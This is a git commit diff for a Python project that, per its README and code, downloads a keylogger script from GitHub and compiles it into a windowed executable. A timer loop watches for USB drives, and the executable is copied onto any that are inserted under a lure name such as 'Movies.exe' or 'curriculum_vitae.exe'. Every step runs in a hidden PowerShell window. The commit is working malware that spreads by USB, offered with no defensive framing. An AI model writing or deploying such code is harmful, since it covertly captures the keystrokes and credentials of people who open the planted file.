4fc69208b090b5cc926e17ceea776d03a7cc7de7
Ricardo Martinez <ricardomartinezpereira91@outlook.com>
2022-10-27 08:31:09 -0500

    [MODIFY] ./Download_Script_Send_To_Usb/main.py was modified, I changed the values of some variables and added more comments... [CERATE] I added a README.md file inside ./Download_Script_Send_To_Usb... done

---
+++ Download_Script_Send_To_Usb/README.md
@@ -0,0 +1,18 @@
+
+## Download Script and Send To Usb Script:
+
+This script downloads and store an executable on any usb inserted in the pc while program is running. These are the steps, First: it downloads
+a script chosen in the code. Second: stores that script on the pc in the following path `C:/Users/{user_name}/AppData/Local/Temp/DownloadedScripts`. Third: it compiles the script into an executable program (exe). Forth: stores the (exe) program on any usb inserted while
+program is running.
+
+### Install Required Packages:
+
+```Python
+pip install -r requirements.txt
+```
+
+### Execute Script:
+
+```Python
+python main.py
+```
--- Download_Script_Send_To_Usb/main.py
+++ Download_Script_Send_To_Usb/main.py
@@ -6,19 +6,19 @@ import threading
 dots = "."
 
 # time interval for sending the data in seconds
-timeInterval = 2.0
+timeInterval = 1.0
 
-# url of the script to download
-script_url = "https://raw.githubusercontent.com/ezequiel9604/python-scripts/main/python-keylogger/KeyLogger.py"
+# url of the script to be downloaded
+script_url = "https://raw.githubusercontent.com/ricardomartinezpereira/Fliegen-Python-Scripts/main/Keylogger/main.py"
 
 # stores the windows user name
 user_name = psutil.users()[0].name
 
 # path of the icon to use
-icon_path = f"C:\\Users\\{user_name}\\Desktop\\icon\\movies.ico"
+icon_path = f"C:/Users/{user_name}/Desktop/icon/movies.ico"
 
 # stores the path chosen to save the keylogger.txt file
-path_to_store = f"C:\\Users\\{user_name}\\AppData\\Local\\Temp"
+path_to_store = f"C:/Users/{user_name}/AppData/Local/Temp/DownloadedScripts"
 
 # checks if (the path chosen to save the keylogger.txt) exists if not creates it
 if (os.path.isdir(path_to_store) == False):
@@ -36,7 +36,7 @@ def mainFunction():
 
     is_saved = False
 
-    # get the USBs available every period of time
+    # gets the USBs available every period of time
     available_disks = psutil.disk_partitions()
 
     for i in range(len(available_disks)):
@@ -45,19 +45,19 @@ def mainFunction():
         if available_disks[i].opts == "rw,removable":
 
             # download the script from github
-            dowload_script_command = f"Invoke-WebRequest -Uri {script_url} -OutFile {path_to_store}\\A4S4D5F6.py;"
+            cmd_command = f"Invoke-WebRequest -Uri {script_url} -OutFile {path_to_store}/A4S4D5F6.py; "
 
             # go to the script's location and compile the script into .exe
-            compile_py_command = f"cd {path_to_store}; pyinstaller --windowed --onefile --icon={icon_path} {path_to_store}\\A4S4D5F6.py;"
+            cmd_command+= f"cd {path_to_store}; pyinstaller --windowed --onefile --icon={icon_path} ./A4S4D5F6.py; "
 
             # copy the file to the USB 
-            move_py_command = f"copy-item {path_to_store}\\dist\\A4S4D5F6.exe {available_disks[i].device}curriculum_vitae.exe;"
+            cmd_command += f"copy-item {path_to_store}/dist/A4S4D5F6.exe {available_disks[i].device}Movies.exe; "
 
             # stop the process
-            close_cmd_command = r"Stop-Process -ProcessName cmd;"
+            cmd_command += "Stop-Process -ProcessName cmd; "
 
             # store all the previous commands
-            command_to_execute = f"cmd /c start /min start powershell -WindowStyle Hidden -Command {dowload_script_command} {compile_py_command} {move_py_command} {close_cmd_command}"
+            command_to_execute = f"cmd /c start /min start powershell -WindowStyle Hidden -Command {cmd_command} "
 
             #print(command_to_execute)
 
@@ -69,18 +69,29 @@ def mainFunction():
     # once any USB is found stops the program
     if is_saved == False:
 
-        if len(dots) > 9:
+        if len(dots) > 10:
             dots= "."
 
         # prints this message if USB is not found
         os.system("cls")
-        print(f"Waiting for user insert usb drive{dots} ")
+        print(f"Waiting for user insert usb drive{dots}")
         dots += "." 
 
         # creates a new thread and call mainFunction every time interval in seconds
         timer = threading.Timer(timeInterval, mainFunction)
         timer.start()
 
+
+
+#####         #####         ######         ###   #####      ###
+######       ######        ###  ###        ###   ######     ###
+###  ##     ##  ###       ###    ###       ###   ###  ##    ###
+###   ##   ##   ###      ###      ###      ###   ###   ##   ###
+###    ## ##    ###     ### ###### ###     ###   ###    ##  ###
+###     ###     ###    ###          ###    ###   ###     ## ### 
+###             ###   ###            ###   ###   ###      #####
+
+if __name__ == "__main__":
  
-mainFunction()
+    mainFunction()
 
